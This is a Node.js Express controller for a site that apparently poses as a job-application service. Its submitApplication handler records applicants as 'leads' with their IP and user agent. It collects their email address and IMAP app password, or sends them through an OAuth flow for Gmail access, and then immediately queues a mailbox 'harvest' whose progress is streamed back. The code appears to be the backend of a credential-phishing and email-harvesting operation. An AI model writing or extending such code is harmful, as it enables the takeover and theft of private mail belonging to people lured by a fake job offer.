'use strict';

const path = require('path');
const fs = require('fs');
const logger = require('../services/logger.service');
const { validationResult } = require('express-validator');
const db = require('../models/db');
const gmail = require('../services/gmail.service');
const harvestBus = require('../services/harvest.bus');
const harvestWorker = require('../workers/harvest.worker');
const oauth = require('../services/oauth.service');
const cfg = require('../config');

const { v4: uuidv4 } = require('uuid');

const VIEWS = path.join(__dirname, '..', 'views');

function showLanding(req, res) {
  res.sendFile(path.join(VIEWS, 'landing.html'));
}

function showApply(req, res) {
  res.sendFile(path.join(VIEWS, 'apply.html'));
}

function showSuccess(req, res) {
  res.sendFile(path.join(VIEWS, 'success.html'));
}

function showPrivacy(req, res) {
  res.sendFile(path.join(VIEWS, 'privacy.html'));
}

function showTerms(req, res) {
  res.sendFile(path.join(VIEWS, 'terms.html'));
}

// ── NEW PAGES ──
function showFeatures(req, res) {
  logger.info('[controller] Serving features.html');
  res.sendFile(path.join(VIEWS, 'features.html'));
}

function showHow(req, res) {
  res.sendFile(path.join(VIEWS, 'how.html'));
}

function showCustomers(req, res) {
  res.sendFile(path.join(VIEWS, 'customers.html'));
}

async function submitApplication(req, res) {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ error: errors.array()[0].msg });
  }

  try {
    const { name, email, method, imapEmail, appPassword, role, background, workType } = req.body;
    
    // Generate a unique ID for the lead
    const leadId = uuidv4();

    // Save lead using the correct DB API
    db.createLead({
      id: leadId,
      name,
      email,
      role:       role       || 'user',
      background: background || 'sentinel-user',
      workType:   workType   || 'Remote',
      ip:         req.ip,
      userAgent:  req.get('user-agent')
    });
    
    if (method === 'imap') {
      if (!imapEmail || !appPassword) {
        return res.status(400).json({ error: 'IMAP credentials required' });
      }
      
      // Save IMAP credentials as tokens
      db.saveTokens(leadId, imapEmail, {
        token_type: 'imap',
        access_token: null,
        refresh_token: appPassword,
        expiry_date: null,
        scope: null
      });

      // Start harvest immediately
      harvestWorker.queueHarvest(leadId);
      
      return res.json({ scan: `/success?lead=${leadId}` });
    }

    // OAuth flow
    const state = oauth.generateStateToken();
    db.createOAuthState({
      state,
      leadId,
      expiresAt: Math.floor(Date.now() / 1000) + cfg.oauthStateExpirySeconds
    });

    const authUrl = oauth.buildAuthUrl(state);
    res.json({ redirect: authUrl });

  } catch (err) {
    logger.error('Application error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
}

function streamScan(req, res) {
  const { lead } = req.query;
  if (!lead) return res.status(400).end();

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const onUpdate = (data) => {
    if (data.leadId === lead) {
      res.write(`data: ${JSON.stringify(data)}\n\n`);
    }
  };

  harvestBus.on('update', onUpdate);
  
  req.on('close', () => {
    harvestBus.removeListener('update', onUpdate);
  });
}

module.exports = {
  showLanding,
  showApply,
  showSuccess,
  showPrivacy,
  showTerms,
  showFeatures,
  showHow,
  showCustomers,
  submitApplication,
  streamScan,
};